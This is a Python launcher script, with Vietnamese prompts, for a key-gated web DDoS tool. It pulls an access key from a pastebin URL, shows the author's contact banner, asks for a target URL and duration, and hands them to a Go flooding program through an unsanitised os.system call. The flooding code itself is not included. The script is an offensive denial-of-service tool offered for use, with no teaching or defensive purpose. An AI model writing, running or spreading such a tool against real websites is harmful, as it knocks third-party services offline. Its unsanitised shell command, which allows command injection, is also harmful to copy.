from colorama import Fore, Back, Style
import os
import pyttsx3
import sys
import platform
import requests
import time
key = requests.get("https://pastebin.com/raw/iq1JQC1L").text
nhap_key = input(Fore.CYAN +"vui lòng nhập key: ")
if key == nhap_key:
	print (Fore.RED +"đúng key vào tool ngay")
else:
    print (Fore.RED +"sai key vui lòng thử lại")
    quit()
    
    
    #Chuẩn bị
print(Fore.BLUE +"\nĐang vào sever ddos của THIỆN LÊ!")
for i in range(5,0,-1):
    print(i,end=" ",flush=True)
    time.sleep(1)
print(Fore.YELLOW +"\nĐã vào sever!")
from colorama import Fore, Back, Style
import os
import pyttsx3
import sys
import platform
def say_stuff(stuff_to_say):
    engine = pyttsx3.init()
    engine.say(str(stuff_to_say))
    engine.runAndWait()
if str(platform.system()) == 'Linux':
    os.system('')
print (Fore.GREEN +"---------------------------------------------------------------------")
print (Fore.CYAN +"| CRE : THIENLE|TOOL DDOS-WEB V1                                    |")
print (Fore.CYAN +"| FACEBOOK : https://www.facebook.com/profile.php?id=100065133848103|")
print (Fore.CYAN +"| LIÊN HỆ ZALO SĐT : 0908598841 HOẶC FACEBOOK                       |")
print (Fore.GREEN +"---------------------------------------------------------------------")

try:
    site = input(Fore.LIGHTGREEN_EX+"╔═══"+Fore.CYAN+"["+Fore.LIGHTGREEN_EX+"Url"+Fore.CYAN+"]"+Fore.LIGHTGREEN_EX+"\n╚══\x1b[38;2;0;255;189m> "+Fore.WHITE)
    threads = input('  \x1b[38;2;255;20;147m•' + Fore.WHITE + 'Time(s): ')
    print('')
    text = print(Fore.GREEN + 'ĐANG KHỞI ĐỘNG TOOL . . .')

    if 'Windows' in str(platform.system()):
        os.system('go run tool.go -site {0}'.format(site))
    else:
        os.system('NQHTOOL={0} go run tool.go -site {1}'.format(threads,site))
    print(Back.BLACK + Fore.GREEN)
    
except:
    print('[+] Installing Dependancies')
    os.system('python3 Install_Dependancies.py')
    os.system('python Install_Dependancies.py')
    os.system('py Install_Dependancies.py')